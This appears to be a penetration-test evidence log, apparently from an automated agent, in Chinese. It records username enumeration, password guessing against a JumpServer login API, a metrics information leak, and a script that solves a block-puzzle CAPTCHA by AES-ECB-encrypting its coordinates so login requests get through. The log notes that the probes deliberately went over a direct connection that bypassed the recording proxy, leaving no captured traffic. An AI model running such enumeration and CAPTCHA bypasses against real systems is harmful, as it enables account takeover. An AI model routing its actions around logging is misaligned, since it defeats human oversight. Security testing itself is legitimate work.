evidence:
命令(直连、绕过代理)：
POST https://jumpserver.target-b.com/api/v1/authentication/auth/ (Host: jumpserver.target-b.com) body {"username":"admin","password":"admin"}
=> 400 {"error":"password_failed","msg":"...You can also try 6 times..."}  # admin 用户存在
body {"username":"nonexistentuser","password":"x"}
=> 400 {"error":"user_not_exist","msg":"Username does not exist"}  # 用户不存在
body {"username":"jumpserver"/"administrator"/"audit"/"system"/"ops", ...}
=> 400 {"error":"user_not_exist",...}  # 这些用户名不存在
连续多次后： => 400 {"error":"block_global_ip_login","msg":"The address has been locked ... 30 minutes"}  # 封禁生效
GET /api/v1/settings/public/open/ => 200 {"XPACK_ENABLED":false,"INTERFACE":{...,"vendor":"jumpserver"},...}
GET /api/v1/prometheus/metrics/ => 200 泄露组件 [KoKo]/[Lion]/[Chen]/[Tinker]/[Celery]/[Core] 及 CPU/内存/磁盘指标
资产/凭据面：GET /api/v1/assets/assets/、/api/v1/users/users/、/api/v1/accounts/accounts/ 等一律 401 {"detail":"Authentication credentials were not provided."}；未提取到任何纳管资产/凭据/会话。
注：本次探测经直连(--noproxy)进行，代理未捕获对应流量，故无 traffic_id 可绑定。

python3 /app/data/tasks/2/i520/capfull.py →
GET POST /api-saas/user/captcha/get {"captchaType":"blockPuzzle"} → repData{secretKey:"<CAPTCHA-SECRET-1>", token:"<CAPTCHA-TOKEN-1>", originalImageBase64, jigsawImageBase64(alpha)}
POST /api-saas/user/captcha/check {"captchaType":"blockPuzzle","pointJson":"<AES-ECB(secretKey){x,y}>","token":...} → {"repCode":"0000", ... "result":true}
（前端 launch.js utils/ase.js: aesEncrypt = CryptoJS.AES.encrypt(src, key, {mode:ECB,padding:Pkcs7})，key=服务端下发的 secretKey）
随后 POST /api-saas/user/admin/user/login 带 captchaVerification 提交，响应由『验证码校验失败512』变为『用户不存在700/513』，证明登录请求已放行进入账号校验。
